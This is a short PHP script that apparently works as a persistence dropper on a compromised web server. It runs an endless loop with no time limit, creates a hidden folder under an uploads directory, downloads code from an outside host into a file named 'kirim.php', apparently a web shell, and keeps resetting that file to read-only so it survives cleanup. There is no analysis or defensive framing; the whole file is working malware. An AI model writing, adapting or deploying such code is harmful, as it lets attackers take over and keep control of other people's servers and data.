<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("/var/www/html/apps/uploaded/AKA/new/")){
        mkdir("/var/www/html/apps/uploaded/AKA/new/");
    }
    if (!file_exists("/var/www/html/apps/uploaded/AKA/new/kirim.php")){
        $text = base64_encode(file_get_contents("https://txtpentest.nasiwebhost.com/script/mi77i.txt"));
        file_put_contents("kirim.php",
        base64_decode($text));
    }
    if (gecko_perm("/var/www/html/apps/uploaded/AKA/new/kirim.php") != 0444){
        chmod("/var/www/html/apps/uploaded/AKA/new/kirim.php", 0444);
    }
}

function gecko_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
